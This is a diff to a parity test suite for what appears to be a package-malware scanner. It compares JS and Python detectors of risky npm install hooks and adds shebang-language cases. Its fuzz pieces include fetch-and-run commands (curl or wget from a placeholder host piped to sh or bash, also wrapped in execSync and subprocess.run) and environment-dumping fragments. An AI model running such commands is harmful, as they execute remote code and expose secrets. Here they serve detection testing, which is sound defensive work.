@@ -1,8 +1,9 @@
 """Engine parity for following install hooks and the install-script and
 import-time tests: the npm engine's js/src/lib/hooks.js against
 lazaret.scanner.core (follow_hook, install_script_risk,
-import_time_risk, node_candidates, and what they rest on: _hook_tokens, a
-shlex tokenizer with a regex fallback, and the `node -e` pattern).
+import_time_risk, node_candidates, shebang_lang, and what they rest on:
+_hook_tokens, a shlex tokenizer with a regex fallback, and the `node -e`
+pattern).
 
 The JS module re-implements Python's shlex (posix, punctuation_chars,
 whitespace_split, no commenters: read_token is the same in CPython 3.10 to
@@ -46,11 +47,11 @@ import { pathToFileURL } from "node:url";
 const h = await import(pathToFileURL(process.argv[1]).href);
 const cases = JSON.parse(readFileSync(0, "utf8"));
 const results = cases.map((s) => [h.shlexSplit(s), h.hookTokens(s), h.followHook(s),
-  h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s)]);
+  h.installScriptRisk(s), h.importTimeRisk(s), h.nodeCandidates(s), h.nodeECodes(s), h.shebangLang(s)]);
 process.stdout.write(JSON.stringify({ twins: h.PY_TWINS, results }));
 """
 FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
-          "node_candidates", "_NODE_E_RE codes")
+          "node_candidates", "_NODE_E_RE codes", "shebang_lang")
 
 # Realistic hook commands and install / import-time scripts
 CURATED = [
@@ -122,6 +123,13 @@ CURATED = [
     "cd a;" * 1200 + "node x.js", "node x.js;" * 1200, " ".join(f"node s{n}.js" for n in range(150)).replace(" node", "; node"),
     "node " + "a" * 4100 + ".js", "cd " + "a" * 4095 + " && node x.js", "x" * 100_001, "\U0001F600" * 50_001,
     "node " + "\U0001F600" * 99_990,
+    # #! lines
+    "#!/usr/bin/env node\n", "#!/usr/bin/node --harmony\nx", "#! /usr/bin/env -S deno run --allow-all\n",
+    "#!/usr/bin/env bun", "#!/usr/local/bin/ts-node", "#!/usr/bin/env tsx\r\n", "#!/usr/bin/python3.11 -u\n",
+    "#!/usr/bin/env PYTHON3", "#!C:/Python/python.exe", "#!/bin/sh\n", "#!/usr/bin/env -i bash -x",
+    "#!/usr/bin/env\nnode\n", "#!\n/usr/bin/node", "#!/usr/bin/env \n", "#!/usr/bin/perl -w\n",
+    "#!/usr/bin/env -S", "#!env node", "#!/usr/bin/env A=1 node", "\ufeff#!/usr/bin/env node", " #!/bin/sh",
+    "#!/bin/\u212ash", "#!/usr/bin/env \u017fh", "#!/usr/bin/nodejs\x1cx", "#!/usr/bin/env\xa0node",
 ]
 
 # The pieces random cases are made of. MIXED reaches every function; the
@@ -175,6 +183,10 @@ SCRIPT = ["\n", "\n", " ", "curl -s ", "wget -qO- ", "https://files.invalid/x.sh
           "x.onion", "env | ", "printenv > ", "$(env)", "Object.keys(process.env)", ".npmrc", "\u017f", "\u212a",
           "execSync('curl -s https://files.invalid/x.sh | sh')",
           "subprocess.run(\"wget -qO- https://files.invalid/x|bash\")"]
+SHEBANG = ["#!", " ", " ", "\t", "\n", "\r", "/", "/usr/bin/", "/usr/bin/env", "env", "-S", "-i", "-u", "--",
+           "node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "py", "pypy",
+           "sh", "bash", "zsh", "perl", "A=1", "\u212a", "\u017f", "\x1c", "\xa0", "\x85", "\u0663", "\U0001F600",
+           ".exe", "x"]
 
 
 def corpus(seed=20260926, scale=1):
@@ -189,6 +201,12 @@ def corpus(seed=20260926, scale=1):
                                 (SCRIPT, 1000, 12)):
         for _ in range(count * scale):
             cases.append("".join(rnd.choice(pieces) for _ in range(rnd.randint(1, most))))
+    for _ in range(1500 * scale):                   # #! lines: an interpreter, then anything
+        head = rnd.choice(["", " ", "\t", "/usr/bin/", "/usr/bin/env ", "/usr/bin/env -S ", "env\t", "/bin/", "\n"])
+        name = rnd.choice(["node", "NODE", "nodejs", "deno", "bun", "ts-node", "tsx", "python", "python3.12", "PY",
+                           "pypy", "sh", "bash", "zsh", "perl", "env", "\u212ash", "\u017fh", "x"])
+        after = rnd.choice(["", " ", "\t", "\n", "\r\n", "\x1c", "\xa0", "/"])
+        cases.append("#!" + head + name + after + "".join(rnd.choice(SHEBANG) for _ in range(rnd.randint(0, 6))))
     return [json.loads(json.dumps(text)) for text in cases]
 
 
@@ -208,7 +226,8 @@ def core_view(text):
     reasons, line = core.import_time_risk(text)
     return [shlex_tokens(text), core._hook_tokens(text), list(core.follow_hook(text)),
             core.install_script_risk(text), [reasons, line], core.node_candidates(text),
-            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)]]
+            [next(g for g in m.groups() if g is not None) for m in core._NODE_E_RE.finditer(text)],
+            core.shebang_lang(text)]
 
 
 def run_npm(cases):
@@ -252,14 +271,16 @@ class HookParityTests(unittest.TestCase):
         """Guards the comparison against a corpus that stopped exercising
         something: each count is well above zero for this seed."""
         counts = collections.Counter()
-        for tokens, _, (targets, complete), install, (on_import, _), _, codes in self.views:
+        for tokens, _, (targets, complete), install, (on_import, _), _, codes, lang in self.views:
             counts["shlex raises"] += tokens is None
+            if lang:
+                counts[f"#! {lang}"] += 1
             counts["targets"] += bool(targets)
             counts["not followed completely"] += not complete
             counts["node -e codes"] += bool(codes)
             for reason in install + on_import:
                 counts[reason.split(" (")[0]] += 1          # (the exfiltration reason names the address)
-        self.assertEqual(len(counts), 9, counts)            # 3 install-script reasons, 2 import-time ones
+        self.assertEqual(len(counts), 12, counts)           # 3 install-script reasons, 2 import-time ones, 3 #! languages
         self.assertEqual({k: n for k, n in counts.items() if n < 100 and k != "not followed completely"}, {}, counts)
         self.assertGreaterEqual(counts["not followed completely"], 7, counts)   # the curated limit cases
 
@@ -280,8 +301,8 @@ class HookParityTests(unittest.TestCase):
                 self.assertEqual(table, {k: sorted(v) for k, v in getattr(core, name).items()})
         self.assertEqual(self.twins["limits"], {k: getattr(core, k) for k in
                                                 ("HOOK_MAX_CHARS", "HOOK_MAX_COMMANDS", "HOOK_MAX_TARGETS", "HOOK_MAX_PATH")})
-        self.assertEqual(len(self.twins["patterns"]), 12)
-        self.assertEqual(len(self.twins["sets"]), 8)
+        self.assertEqual(len(self.twins["patterns"]), 13)
+        self.assertEqual(len(self.twins["sets"]), 9)
         self.assertEqual(len(self.twins["maps"]), 3)
 
 if __name__ == "__main__":
